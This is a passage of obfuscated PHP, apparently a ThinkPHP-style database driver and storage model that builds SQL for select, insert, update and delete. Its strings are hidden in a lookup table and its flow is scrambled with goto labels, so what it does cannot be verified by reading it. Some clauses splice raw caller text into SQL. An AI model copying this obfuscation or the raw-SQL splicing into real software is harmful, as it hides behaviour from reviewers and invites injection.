empty($Cè›ÔÓòöò) ? $fÂÖˆ°©Ü©[33] : $fÂÖˆ°©Ü©[921] . $Cè›ÔÓòöò; } protected function parseWhereItem($A«…Ã¼°Ü, $cë˜¸¿©Ë) { $eÚÔåœ³Ùè =& $_SERVER[ì‹É]; $aµòÙ¦âë = $eÚÔåœ³Ùè[33]; if (is_array($cë˜¸¿©Ë)) { if (is_string($cë˜¸¿©Ë[0])) { $CĞœğÖ·×¡ = strtolower($cë˜¸¿©Ë[0]); if (in_array($cë˜¸¿©Ë[0], array($eÚÔåœ³Ùè[904], $eÚÔåœ³Ùè[922], $eÚÔåœ³Ùè[923], $eÚÔåœ³Ùè[924], $eÚÔåœ³Ùè[925], $eÚÔåœ³Ùè[926]))) { $aµòÙ¦âë .= $A«…Ã¼°Ü . $eÚÔåœ³Ùè[50] . $cë˜¸¿©Ë[0] . $eÚÔåœ³Ùè[50] . $this->parseValue($cë˜¸¿©Ë[1]); } elseif (preg_match($eÚÔåœ³Ùè[927], $cë˜¸¿©Ë[0])) { $aµòÙ¦âë .= $A«…Ã¼°Ü . $eÚÔåœ³Ùè[50] . $this->exp[$CĞœğÖ·×¡] . $eÚÔåœ³Ùè[50] . $this->parseValue($cë˜¸¿©Ë[1]); } elseif (preg_match($eÚÔåœ³Ùè[928], $cë˜¸¿©Ë[0])) { if (is_array($cë˜¸¿©Ë[1])) { $Aİ£Ë’ñ¥„ = isset($cë˜¸¿©Ë[2]) ? strtoupper($cë˜¸¿©Ë[2]) : $eÚÔåœ³Ùè[913]; if (in_array($Aİ£Ë’ñ¥„, array($eÚÔåœ³Ùè[912], $eÚÔåœ³Ùè[913], $eÚÔåœ³Ùè[914]))) { $eÌ¡Š˜Óˆ = array(); foreach ($cë˜¸¿©Ë[1] as $b‡ÇÈ¡™æ) { $eÌ¡Š˜Óˆ[] = $A«…Ã¼°Ü . $eÚÔåœ³Ùè[50] . $this->exp[$CĞœğÖ·×¡] . $eÚÔåœ³Ùè[50] . $this->parseValue($b‡ÇÈ¡™æ); } $aµòÙ¦âë .= $eÚÔåœ³Ùè[245] . implode($eÚÔåœ³Ùè[50] . $Aİ£Ë’ñ¥„ . $eÚÔåœ³Ùè[50], $eÌ¡Š˜Óˆ) . $eÚÔåœ³Ùè[813]; } } else { $aµòÙ¦âë .= $A«…Ã¼°Ü . $eÚÔåœ³Ùè[50] . $this->exp[$CĞœğÖ·×¡] . $eÚÔåœ³Ùè[50] . $this->parseValue($cë˜¸¿©Ë[1]); } } elseif ($eÚÔåœ³Ùè[282] == $CĞœğÖ·×¡) { $aµòÙ¦âë .= $eÚÔåœ³Ùè[811] . $A«…Ã¼°Ü . $eÚÔåœ³Ùè[50] . $cë˜¸¿©Ë[1] . $eÚÔåœ³Ùè[929]; } elseif (preg_match($eÚÔåœ³Ùè[930], $cë˜¸¿©Ë[0])) { if (isset($cë˜¸¿©Ë[2]) && $eÚÔåœ³Ùè[282] == $cë˜¸¿©Ë[2]) { $aµòÙ¦âë .= $A«…Ã¼°Ü . $eÚÔåœ³Ùè[50] . $this->exp[$CĞœğÖ·×¡] . $eÚÔåœ³Ùè[50] . $cë˜¸¿©Ë[1]; } else { if (is_string($cë˜¸¿©Ë[1])) { $cë˜¸¿©Ë[1] = explode($eÚÔåœ³Ùè[47], $cë˜¸¿©Ë[1]); } $C©ÊŒŠàİ± = implode($eÚÔåœ³Ùè[47], $this->parseValue($cë˜¸¿©Ë[1])); $aµòÙ¦âë .= $A«…Ã¼°Ü . $eÚÔåœ³Ùè[50] . $this->exp[$CĞœğÖ·×¡] . $eÚÔåœ³Ùè[811] . $C©ÊŒŠàİ± . $eÚÔåœ³Ùè[813]; } } elseif (preg_match($eÚÔåœ³Ùè[931], $cë˜¸¿©Ë[0])) { $Cğ¯ÄÃÀáñ = is_string($cë˜¸¿©Ë[1]) ? explode($eÚÔåœ³Ùè[47], $cë˜¸¿©Ë[1]) : $cë˜¸¿©Ë[1]; $aµòÙ¦âë .= $eÚÔåœ³Ùè[811] . $A«…Ã¼°Ü . $eÚÔåœ³Ùè[50] . $this->exp[$CĞœğÖ·×¡] . $eÚÔåœ³Ùè[50] . $this->parseValue($Cğ¯ÄÃÀáñ[0]) . $eÚÔåœ³Ùè[915] . $this->parseValue($Cğ¯ÄÃÀáñ[1]) . $eÚÔåœ³Ùè[263]; } else { think_exception(think_lang($eÚÔåœ³Ùè[918]) . $eÚÔåœ³Ùè[4] . $cë˜¸¿©Ë[0]); } } else { $EÅ“ö¨³ = count($cë˜¸¿©Ë); $Eˆàª§¢ê¥ = isset($cë˜¸¿©Ë[$EÅ“ö¨³ - 1]) ? strtoupper($cë˜¸¿©Ë[$EÅ“ö¨³ - 1]) : $eÚÔåœ³Ùè[33]; if (in_array($Eˆàª§¢ê¥, array($eÚÔåœ³Ùè[912], $eÚÔåœ³Ùè[913], $eÚÔåœ³Ùè[914]))) { $EÅ“ö¨³ = $EÅ“ö¨³ - 1; } else { $Eˆàª§¢ê¥ = $eÚÔåœ³Ùè[912]; } for ($cÍ˜ØŠãØŒ = 0; $cÍ˜ØŠãØŒ < $EÅ“ö¨³; $cÍ˜ØŠãØŒ++) { $Cğ¯ÄÃÀáñ = is_array($cë˜¸¿©Ë[$cÍ˜ØŠãØŒ]) ? $cë˜¸¿©Ë[$cÍ˜ØŠãØŒ][1] : $cë˜¸¿©Ë[$cÍ˜ØŠãØŒ]; if ($eÚÔåœ³Ùè[282] == strtolower($cë˜¸¿©Ë[$cÍ˜ØŠãØŒ][0])) { $aµòÙ¦âë .= $eÚÔåœ³Ùè[245] . $A«…Ã¼°Ü . $eÚÔåœ³Ùè[50] . $Cğ¯ÄÃÀáñ . $eÚÔåœ³Ùè[929] . $Eˆàª§¢ê¥ . $eÚÔåœ³Ùè[50]; } else { $F ¨…•© = is_array($cë˜¸¿©Ë[$cÍ˜ØŠãØŒ]) ? $this->exp[strtolower($cë˜¸¿©Ë[$cÍ˜ØŠãØŒ][0])] : $eÚÔåœ³Ùè[904]; if (!$F ¨…•© && is_array($cë˜¸¿©Ë[$cÍ˜ØŠãØŒ]) && in_array($cë˜¸¿©Ë[$cÍ˜ØŠãØŒ][0], array($eÚÔåœ³Ùè[904], $eÚÔåœ³Ùè[922], $eÚÔåœ³Ùè[923], $eÚÔåœ³Ùè[924], $eÚÔåœ³Ùè[925], $eÚÔåœ³Ùè[926]))) { $F ¨…•© = $cë˜¸¿©Ë[$cÍ˜ØŠãØŒ][0]; } $aµòÙ¦âë .= $eÚÔåœ³Ùè[245] . $A«…Ã¼°Ü . $eÚÔåœ³Ùè[50] . $F ¨…•© . $eÚÔåœ³Ùè[50] . $this->parseValue($Cğ¯ÄÃÀáñ) . $eÚÔåœ³Ùè[929] . $Eˆàª§¢ê¥ . $eÚÔåœ³Ùè[50]; } } $aµòÙ¦âë = substr($aµòÙ¦âë, 0, -4); } } else { $aµòÙ¦âë .= $A«…Ã¼°Ü . $eÚÔåœ³Ùè[932] . $this->parseValue($cë˜¸¿©Ë); } return $aµòÙ¦âë; } protected function parseThinkWhere($e®ïÓ–³Ü, $FÅ•¾Ê–¥‡) { $CÚ§®„Íóİ =& $_SERVER[ì‹É]; $bô±­ññÆ’ = $CÚ§®„Íóİ[33]; switch ($e®ïÓ–³Ü) { case $CÚ§®„Íóİ[335]: $bô±­ññÆ’ = $FÅ•¾Ê–¥‡; break; case $CÚ§®„Íóİ[916]: $bô±­ññÆ’ = is_string($FÅ•¾Ê–¥‡) ? $FÅ•¾Ê–¥‡ : substr($this->parseWhere($FÅ•¾Ê–¥‡), 6); break; case $CÚ§®„Íóİ[933]: parse_str($FÅ•¾Ê–¥‡, $Déò½¯²´Î); if (isset($Déò½¯²´Î[$CÚ§®„Íóİ[911]])) { $Cƒ— ÇÄ… = $CÚ§®„Íóİ[50] . strtoupper($Déò½¯²´Î[$CÚ§®„Íóİ[911]]) . $CÚ§®„Íóİ[50]; unset($Déò½¯²´Î[$CÚ§®„Íóİ[911]]); } else { $Cƒ— ÇÄ… = $CÚ§®„Íóİ[915]; } $dŠÉÚæÉÏÊ = array(); foreach ($Déò½¯²´Î as $C¥ïƒÊÂÛ => $bà—éÂ‰) { $dŠÉÚæÉÏÊ[] = $this->parseKey($C¥ïƒÊÂÛ) . $CÚ§®„Íóİ[932] . $this->parseValue($bà—éÂ‰); } $bô±­ññÆ’ = implode($Cƒ— ÇÄ…, $dŠÉÚæÉÏÊ); break; } return $bô±­ññÆ’; } protected function parseLimit($E‡‘Šõ™) { $Aß³ àõÅĞ =& $_SERVER[ì‹É]; return !empty($E‡‘Šõ™) ? $Aß³ àõÅĞ[48] . $E‡‘Šõ™ . $Aß³ àõÅĞ[50] : $Aß³ àõÅĞ[33]; } protected function parseJoin($cĞ…ñïÔ ø) { $eº™•½Ù´Á =& $_SERVER[ì‹É]; $aöİºÑ˜¼² = $eº™•½Ù´Á[33]; if (!empty($cĞ…ñïÔ ø)) { if (is_array($cĞ…ñïÔ ø)) { foreach ($cĞ…ñïÔ ø as $D™´©×ÀËî => $dÛ™Ø’‡šÏ) { if (!1 !== stripos($dÛ™Ø’‡šÏ, $eº™•½Ù´Á[934])) { $aöİºÑ˜¼² .= $eº™•½Ù´Á[50] . $dÛ™Ø’‡šÏ; } else { $aöİºÑ˜¼² .= $eº™•½Ù´Á[935] . $dÛ™Ø’‡šÏ; } } } else { $aöİºÑ˜¼² .= $eº™•½Ù´Á[935] . $cĞ…ñïÔ ø; } } $aöİºÑ˜¼² = preg_replace($eº™•½Ù´Á[936], think_config($eº™•½Ù´Á[839]) . $eº™•½Ù´Á[937], $aöİºÑ˜¼²); return $aöİºÑ˜¼²; } protected function parseOrder($C·—îµ›ğÅ) { $cê’›ˆ»¬Ÿ =& $_SERVER[ì‹É]; if (is_array($C·—îµ›ğÅ)) { $fÆöÖá‘œù = array(); foreach ($C·—îµ›ğÅ as $bÉÀª¥ŠéÊ => $BáŞ´’ ó) { if (is_numeric($bÉÀª¥ŠéÊ)) { $fÆöÖá‘œù[] = $this->parseKey($BáŞ´’ ó); } else { $BáŞ´’ ó = in_array(strtoupper(trim($BáŞ´’ ó)), array($cê’›ˆ»¬Ÿ[938], $cê’›ˆ»¬Ÿ[939])) ? $cê’›ˆ»¬Ÿ[50] . $BáŞ´’ ó : $cê’›ˆ»¬Ÿ[33]; if (preg_match($cê’›ˆ»¬Ÿ[940], $bÉÀª¥ŠéÊ)) { $fÆöÖá‘œù[] = $this->parseKey($bÉÀª¥ŠéÊ) . $BáŞ´’ ó; } else { think_exception($cê’›ˆ»¬Ÿ[941] . $bÉÀª¥ŠéÊ); } } } $C·—îµ›ğÅ = implode($cê’›ˆ»¬Ÿ[47], $fÆöÖá‘œù); } return !empty($C·—îµ›ğÅ) ? $cê’›ˆ»¬Ÿ[942] . $C·—îµ›ğÅ : $cê’›ˆ»¬Ÿ[33]; } protected function parseGroup($DåæŒÏØÄÑ) { $b®‡¬¦§ï =& $_SERVER[ì‹É]; return !empty($DåæŒÏØÄÑ) ? $b®‡¬¦§ï[943] . $DåæŒÏØÄÑ : $b®‡¬¦§ï[33]; } protected function parseHaving($EŠ±Â©ŞÕ) { $BÕç™â­•á =& $_SERVER[ì‹É]; return !empty($EŠ±Â©ŞÕ) ? $BÕç™â­•á[944] . $EŠ±Â©ŞÕ : $BÕç™â­•á[33]; } protected function parseComment($aªàŸöšÀÑ) { $B†Å‹Ã‘Õ½ =& $_SERVER[ì‹É]; return !empty($aªàŸöšÀÑ) ? $B†Å‹Ã‘Õ½[945] . $aªàŸöšÀÑ . $B†Å‹Ã‘Õ½[946] : $B†Å‹Ã‘Õ½[33]; } protected function parseDistinct($FÓâ—…²¦µ) { $D÷äÆµì·² =& $_SERVER[ì‹É]; return !empty($FÓâ—…²¦µ) ? $D÷äÆµì·²[947] : $D÷äÆµì·²[33]; } protected function parseUnion($FŸÔ´‘¹Å…) { $E†Ê‚’¸¦â =& $_SERVER[ì‹É]; if (empty($FŸÔ´‘¹Å…)) { return $E†Ê‚’¸¦â[33]; } if (isset($FŸÔ´‘¹Å…[$E†Ê‚’¸¦â[333]])) { $Båó–à­  = $E†Ê‚’¸¦â[948]; unset($FŸÔ´‘¹Å…[$E†Ê‚’¸¦â[333]]); } else { $Båó–à­  = $E†Ê‚’¸¦â[949]; } foreach ($FŸÔ´‘¹Å… as $bÇ¤§¤æ‡¹) { $A·å‹ÌÜÍ[] = $Båó–à­  . (is_array($bÇ¤§¤æ‡¹) ? $this->buildSelectSql($bÇ¤§¤æ‡¹) : $bÇ¤§¤æ‡¹); } return implode($E†Ê‚’¸¦â[50], $A·å‹ÌÜÍ); } public function insert($dßÅ‚¨„—, $fî¥µ›‡À = array(), $F‹”ÅêƒÎá = false) { goto dì³Ä‹®–Î; aŠì¸Ÿ‡Õğ: foreach ($dßÅ‚¨„— as $EÓÒ¿°»ÁÒ => $E¡ğ‰³Íñ) { if (is_array($E¡ğ‰³Íñ) && $b¤Í…‘É‰İ[282] == $E¡ğ‰³Íñ[0]) { $e„²‡­Ïš[] = $this->parseKey($EÓÒ¿°»ÁÒ); $aÙò‘ß±ïë[] = $E¡ğ‰³Íñ[1]; } elseif (is_scalar($E¡ğ‰³Íñ) || is_null($E¡ğ‰³Íñ)) { $e„²‡­Ïš[] = $this->parseKey($EÓÒ¿°»ÁÒ); $aÙò‘ß±ïë[] = $this->parseValue($E¡ğ‰³Íñ); } } $E›È‘Ô’ƒà = ($F‹”ÅêƒÎá ? $b¤Í…‘É‰İ[815] : $b¤Í…‘É‰İ[816]) . $b¤Í…‘É‰İ[817] . $this->parseTable($fî¥µ›‡À[$b¤Í…‘É‰İ[264]]) . $b¤Í…‘É‰İ[811] . implode($b¤Í…‘É‰İ[47], $e„²‡­Ïš) . $b¤Í…‘É‰İ[812] . implode($b¤Í…‘É‰İ[47], $aÙò‘ß±ïë) . $b¤Í…‘É‰İ[813]; $E›È‘Ô’ƒà .= $this->parseLock(isset($fî¥µ›‡À[$b¤Í…‘É‰İ[774]]) ? $fî¥µ›‡À[$b¤Í…‘É‰İ[774]] : !1); goto c¸Äò ¹Ûç; c¸Äò ¹Ûç: $E›È‘Ô’ƒà .= $this->parseComment(!empty($fî¥µ›‡À[$b¤Í…‘É‰İ[337]]) ? $fî¥µ›‡À[$b¤Í…‘É‰İ[337]] : $b¤Í…‘É‰İ[33]); return $this->execute($E›È‘Ô’ƒà, $this->parseBind(!empty($fî¥µ›‡À[$b¤Í…‘É‰İ[270]]) ? $fî¥µ›‡À[$b¤Í…‘É‰İ[270]] : array())); goto a”ù³½¥Ã±; dì³Ä‹®–Î: $b¤Í…‘É‰İ =& $_SERVER[ì‹É]; $aÙò‘ß±ïë = $e„²‡­Ïš = array(); $this->model = $fî¥µ›‡À[$b¤Í…‘É‰İ[266]]; goto aŠì¸Ÿ‡Õğ; a”ù³½¥Ã±: } public function selectInsert($C¿„Âê‹ö, $aÌÁ¾²§÷, $DÚšŸœ†½ = array()) { goto C¤œÌ·ìšì; dõÖ¨à·ï: return $this->execute($e’´‘Âèù„, $this->parseBind(!empty($DÚšŸœ†½[$Fµ´İ’•‘ª[270]]) ? $DÚšŸœ†½[$Fµ´İ’•‘ª[270]] : array())); goto AòÃùñ‘µœ; b™İ‡‚İã: array_walk($C¿„Âê‹ö, array($this, $Fµ´İ’•‘ª[814])); $e’´‘Âèù„ = $Fµ´İ’•‘ª[950] . $this->parseTable($aÌÁ¾²§÷) . $Fµ´İ’•‘ª[811] . implode($Fµ´İ’•‘ª[47], $C¿„Âê‹ö) . $Fµ´İ’•‘ª[929]; $e’´‘Âèù„ .= $this->buildSelectSql($DÚšŸœ†½); goto dõÖ¨à·ï; C¤œÌ·ìšì: $Fµ´İ’•‘ª =& $_SERVER[ì‹É]; $this->model = $DÚšŸœ†½[$Fµ´İ’•‘ª[266]]; if (is_string($C¿„Âê‹ö)) { $C¿„Âê‹ö = explode($Fµ´İ’•‘ª[47], $C¿„Âê‹ö); } goto b™İ‡‚İã; AòÃùñ‘µœ: } public function update($e¸Óß™ªĞ, $C•„¾×öóÒ) { $b¢·¡ÌöÛ =& $_SERVER[ì‹É]; $this->model = $C•„¾×öóÒ[$b¢·¡ÌöÛ[266]]; $D»èèô ø = $b¢·¡ÌöÛ[951] . $this->parseTable($C•„¾×öóÒ[$b¢·¡ÌöÛ[264]]) . $this->parseSet($e¸Óß™ªĞ) . $this->parseWhere(!empty($C•„¾×öóÒ[$b¢·¡ÌöÛ[260]]) ? $C•„¾×öóÒ[$b¢·¡ÌöÛ[260]] : $b¢·¡ÌöÛ[33]) . $this->parseOrder(!empty($C•„¾×öóÒ[$b¢·¡ÌöÛ[346]]) ? $C•„¾×öóÒ[$b¢·¡ÌöÛ[346]] : $b¢·¡ÌöÛ[33]) . $this->parseLimit(!empty($C•„¾×öóÒ[$b¢·¡ÌöÛ[277]]) ? $C•„¾×öóÒ[$b¢·¡ÌöÛ[277]] : $b¢·¡ÌöÛ[33]) . $this->parseLock(isset($C•„¾×öóÒ[$b¢·¡ÌöÛ[774]]) ? $C•„¾×öóÒ[$b¢·¡ÌöÛ[774]] : !1) . $this->parseComment(!empty($C•„¾×öóÒ[$b¢·¡ÌöÛ[337]]) ? $C•„¾×öóÒ[$b¢·¡ÌöÛ[337]] : $b¢·¡ÌöÛ[33]); return $this->execute($D»èèô ø, $this->parseBind(!empty($C•„¾×öóÒ[$b¢·¡ÌöÛ[270]]) ? $C•„¾×öóÒ[$b¢·¡ÌöÛ[270]] : array())); } public function delete($c˜ˆìŸ­•â = array()) { $cªŸåÔìÓ =& $_SERVER[ì‹É]; $this->model = $c˜ˆìŸ­•â[$cªŸåÔìÓ[266]]; $F…æâÅòå = $cªŸåÔìÓ[952] . $this->parseTable($c˜ˆìŸ­•â[$cªŸåÔìÓ[264]]) . $this->parseWhere(!empty($c˜ˆìŸ­•â[$cªŸåÔìÓ[260]]) ? $c˜ˆìŸ­•â[$cªŸåÔìÓ[260]] : $cªŸåÔìÓ[33]) . $this->parseOrder(!empty($c˜ˆìŸ­•â[$cªŸåÔìÓ[346]]) ? $c˜ˆìŸ­•â[$cªŸåÔìÓ[346]] : $cªŸåÔìÓ[33]) . $this->parseLimit(!empty($c˜ˆìŸ­•â[$cªŸåÔìÓ[277]]) ? $c˜ˆìŸ­•â[$cªŸåÔìÓ[277]] : $cªŸåÔìÓ[33]) . $this->parseLock(isset($c˜ˆìŸ­•â[$cªŸåÔìÓ[774]]) ? $c˜ˆìŸ­•â[$cªŸåÔìÓ[774]] : !1) . $this->parseComment(!empty($c˜ˆìŸ­•â[$cªŸåÔìÓ[337]]) ? $c˜ˆìŸ­•â[$cªŸåÔìÓ[337]] : $cªŸåÔìÓ[33]); return $this->execute($F…æâÅòå, $this->parseBind(!empty($c˜ˆìŸ­•â[$cªŸåÔìÓ[270]]) ? $c˜ˆìŸ­•â[$cªŸåÔìÓ[270]] : array())); } public function select($e«“‘ğ¡Áò = array()) { goto Fâ—ß®İ¶Ò; D«É·³¿ö: $e‰·Ô‹™ = isset($e«“‘ğ¡Áò[$B´‡æÂ±¼ [334]]) ? $e«“‘ğ¡Áò[$B´‡æÂ±¼ [334]] : !1; if ($e‰·Ô‹™) { $Dßô«é…ª = is_string($e‰·Ô‹™[$B´‡æÂ±¼ [90]]) ? $e‰·Ô‹™[$B´‡æÂ±¼ [90]] : $B´‡æÂ±¼ [953] . md5($dÙƒ–¬Öˆ); $bç£‘â£Œ¿ = think_cache($Dßô«é…ª, $B´‡æÂ±¼ [33], $e‰·Ô‹™); if (!1 !== $bç£‘â£Œ¿) { return $bç£‘â£Œ¿; } } $F…õ»Š—íŒ = $this->query($dÙƒ–¬Öˆ, $this->parseBind(!empty($e«“‘ğ¡Áò[$B´‡æÂ±¼ [270]]) ? $e«“‘ğ¡Áò[$B´‡æÂ±¼ [270]] : array())); goto d©áßÇ°; d©áßÇ°: if ($e‰·Ô‹™ && !1 !== $F…õ»Š—íŒ) { think_cache($Dßô«é…ª, $F…õ»Š—íŒ, $e‰·Ô‹™); } return $F…õ»Š—íŒ; goto B¿íù±ÄšÌ; Fâ—ß®İ¶Ò: $B´‡æÂ±¼  =& $_SERVER[ì‹É]; $this->model = $e«“‘ğ¡Áò[$B´‡æÂ±¼ [266]]; $dÙƒ–¬Öˆ = $this->buildSelectSql($e«“‘ğ¡Áò); goto D«É·³¿ö; B¿íù±ÄšÌ: } public function buildSelectSql($Aƒƒ™åá†± = array()) { goto dÉ¾‡ïÔÉ; dÉ¾‡ïÔÉ: $fÄò óè¡Â =& $_SERVER[ì‹É]; if (isset($Aƒƒ™åá†±[$fÄò óè¡Â[336]])) { if (strpos($Aƒƒ™åá†±[$fÄò óè¡Â[336]], $fÄò óè¡Â[47])) { list($Bæ•è†èô», $a›ª·İÂ¿) = explode($fÄò óè¡Â[47], $Aƒƒ™åá†±[$fÄò óè¡Â[336]]); } else { $Bæ•è†èô» = $Aƒƒ™åá†±[$fÄò óè¡Â[336]]; } $Bæ•è†èô» = $Bæ•è†èô» ? $Bæ•è†èô» : 1; $a›ª·İÂ¿ = isset($a›ª·İÂ¿) ? $a›ª·İÂ¿ : (is_numeric($Aƒƒ™åá†±[$fÄò óè¡Â[277]]) ? $Aƒƒ™åá†±[$fÄò óè¡Â[277]] : 20); $D‹áÑòñ„ø = $a›ª·İÂ¿ * ((int) $Bæ•è†èô» - 1); $Aƒƒ™åá†±[$fÄò óè¡Â[277]] = $D‹áÑòñ„ø . $fÄò óè¡Â[47] . $a›ª·İÂ¿; } if (think_config($fÄò óè¡Â[954])) { $dö¸­«Ø± = $fÄò óè¡Â[955] . md5(serialize($Aƒƒ™åá†±)); $cë–µåÜõ = think_cache($dö¸­«Ø±); if ($cë–µåÜõ) { return $cë–µåÜõ; } } goto BµÉ¾›‡‘¦; BµÉ¾›‡‘¦: $dƒÉŸ·êÈ² = $this->parseSql($this->selectSql, $Aƒƒ™åá†±); $dƒÉŸ·êÈ² .= $this->parseLock(isset($Aƒƒ™åá†±[$fÄò óè¡Â[774]]) ? $Aƒƒ™åá†±[$fÄò óè¡Â[774]] : !1); if (isset($dö¸­«Ø±)) { think_cache($dö¸­«Ø±, $dƒÉŸ·êÈ²); } goto C—…³÷ÂÂ…; C—…³÷ÂÂ…: return $dƒÉŸ·êÈ²; goto DÜœëÛ«®å; DÜœëÛ«®å: } public function parseSql($cäË‚¥¿‡, $D­Ññ¥Ø‰Í = array()) { $b®‘Ê£•±¼ =& $_SERVER[ì‹É]; $cäË‚¥¿‡ = str_replace(array($b®‘Ê£•±¼[956], $b®‘Ê£•±¼[957], $b®‘Ê£•±¼[958], $b®‘Ê£•±¼[959], $b®‘Ê£•±¼[960], $b®‘Ê£•±¼[961], $b®‘Ê£•±¼[962], $b®‘Ê£•±¼[963], $b®‘Ê£•±¼[964], $b®‘Ê£•±¼[965], $b®‘Ê£•±¼[966]), array($this->parseTable("{$D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[264]]}"), $this->parseDistinct(isset($D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[967]]) ? $D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[967]] : !1), $this->parseField(!empty($D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[258]]) ? $D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[258]] : $b®‘Ê£•±¼[173]), $this->parseJoin(!empty($D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[267]]) ? $D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[267]] : $b®‘Ê£•±¼[33]), $this->parseWhere(!empty($D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[260]]) ? $D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[260]] : $b®‘Ê£•±¼[33]), $this->parseGroup(!empty($D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[968]]) ? $D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[968]] : $b®‘Ê£•±¼[33]), $this->parseHaving(!empty($D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[969]]) ? $D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[969]] : $b®‘Ê£•±¼[33]), $this->parseOrder(!empty($D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[346]]) ? $D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[346]] : $b®‘Ê£•±¼[33]), $this->parseLimit(!empty($D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[277]]) ? $D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[277]] : $b®‘Ê£•±¼[33]), $this->parseUnion(!empty($D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[332]]) ? $D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[332]] : $b®‘Ê£•±¼[33]), $this->parseComment(!empty($D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[337]]) ? $D­Ññ¥Ø‰Í[$b®‘Ê£•±¼[337]] : $b®‘Ê£•±¼[33])), $cäË‚¥¿‡); return $cäË‚¥¿‡; } public function getLastSql($Eí‡…¯¯ˆ = '') { return $Eí‡…¯¯ˆ ? $this->modelSql[$Eí‡…¯¯ˆ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($DÖÊê±øá¶) { return addslashes($DÖÊê±øá¶); } public function setModel($B‘ôİÛÂ†) { $this->model = $B‘ôİÛÂ†; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto c×î½Ë½µ·; a“‹í¯Ö¹ø: class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\x6d\56\x73\x74\157\x72\141\147\x65\x4c\151\x73\164"; public $field = array("\156\x61\155\145", "\x73\151\172\x65\x4d\141\x78", "\163\x79\x73\x74\145\x6d", "\x64\x65\x66\141\165\x6c\x74", "\x64\162\151\x76\x65\162", "\x63\x6f\156\146\x69\x67"); public function listData($AèñŸö”¨ß = false, $c°’ÌÄÓ•† = "\x6d\x6f\x64\x69\x66\171\x54\151\x6d\145", $aã‚ö–´ƒ‚ = false) { goto b¬ãç¹«Şñ; C´à¼Ø¼ˆ: return $A¥¦¼¥÷¿Ó; goto d“ŒÉ³ˆË; BÈ‰¢­µÊÓ: foreach ($A¥¦¼¥÷¿Ó as $fŸƒø’·¡¸ => $Cà®‰ñ) { unset($A¥¦¼¥÷¿Ó[$fŸƒø’·¡¸][$AšÔÈ®Ş[6]]); $A¥¦¼¥÷¿Ó[$fŸƒø’·¡¸][$AšÔÈ®Ş[2000]] = 0; } $cİª­‹îÃ¸ = array_to_keyvalue($A¥¦¼¥÷¿Ó, $AšÔÈ®Ş[33], $AšÔÈ®Ş[364]); $this->_listAppendSize($A¥¦¼¥÷¿Ó, $cİª­‹îÃ¸); goto C´à¼Ø¼ˆ; b¬ãç¹«Şñ: $AšÔÈ®Ş =& $_SERVER[ì‹É]; $A¥¦¼¥÷¿Ó = parent::listData($AèñŸö”¨ß, $c°’ÌÄÓ•†, $aã‚ö–´ƒ‚); if ($AèñŸö”¨ß) { return $A¥¦¼¥÷¿Ó; } goto BÈ‰¢­µÊÓ; d“ŒÉ³ˆË: } public function _listAppendSize(&$f‰…ŒÙ¤ë, $f›•ç´¦ìÈ) { $DÊñŞÏİ…š =& $_SERVER[ì‹É]; $Aã‡¯„Ë¬ç = $DÊñŞÏİ…š[2253] . implode($DÊñŞÏİ…š[47], $f›•ç´¦ìÈ) . $DÊñŞÏİ…š[2254]; $dŠË¶ÍˆŒÄ = Model($DÊñŞÏİ…š[709])->query($Aã‡¯„Ë¬ç); $dŠË¶ÍˆŒÄ = array_to_keyvalue($dŠË¶ÍˆŒÄ, $DÊñŞÏİ…š[364], $DÊñŞÏİ…š[78]); foreach ($f‰…ŒÙ¤ë as $BÌ²Œ¯ª³Ô => $EƒÌÛ®…©’) { $f‰…ŒÙ¤ë[$BÌ²Œ¯ª³Ô][$DÊñŞÏİ…š[2000]] = isset($dŠË¶ÍˆŒÄ[$EƒÌÛ®…©’[$DÊñŞÏİ…š[364]]]) ? $dŠË¶ÍˆŒÄ[$EƒÌÛ®…©’[$DÊñŞÏİ…š[364]]] : 0; } } public function getConfig($C°Š‚†ï„Ì) { $Dà¤¯³¶İì = parent::listData($C°Š‚†ï„Ì); return json_decode($Dà¤¯³¶İì[$_SERVER[ì‹É][6]], !0); } public function update($C†È»ôÏ, $d‰óôšë¥ù) { goto DÈáÌæù±Ù; DÈáÌæù±Ù: $Dñ¸±©Äò =& $_SERVER[ì‹É]; $EŠ®ÄÃêÛ³ = $d‰óôšë¥ù[$Dñ¸±©Äò[28]]; $bİŒŸœ‡…Ò = array_to_keyvalue(parent::listData(), $Dñ¸±©Äò[28]); goto DØŒÌµ®Ñ•; DØŒÌµ®Ñ•: if (isset($bİŒŸœ‡…Ò[$EŠ®ÄÃêÛ³]) && $bİŒŸœ‡…Ò[$EŠ®ÄÃêÛ³][$Dñ¸±©Äò[364]] != $C†È»ôÏ) { return !1; } if (isset($d‰óôšë¥ù[$Dñ¸±©Äò[2255]]) && $d‰óôšë¥ù[$Dñ¸±©Äò[2255]] == $Dñ¸±©Äò[84]) { $this->checkConfig($d‰óôšë¥ù); } unset($d‰óôšë¥ù[$Dñ¸±©Äò[2255]]); goto aËÔâ’Ä; aËÔâ’Ä: $côå¤†ñö = parent::update($C†È»ôÏ, $d‰óôšë¥ù); if ($côå¤†ñö && $d‰óôšë¥ù[$Dñ¸±©Äò[34]]) { foreach ($bİŒŸœ‡…Ò as $dç¬¯ÌºĞ) { if ($dç¬¯ÌºĞ[$Dñ¸±©Äò[34]] && $dç¬¯ÌºĞ[$Dñ¸±©Äò[364]] != $C†È»ôÏ) { 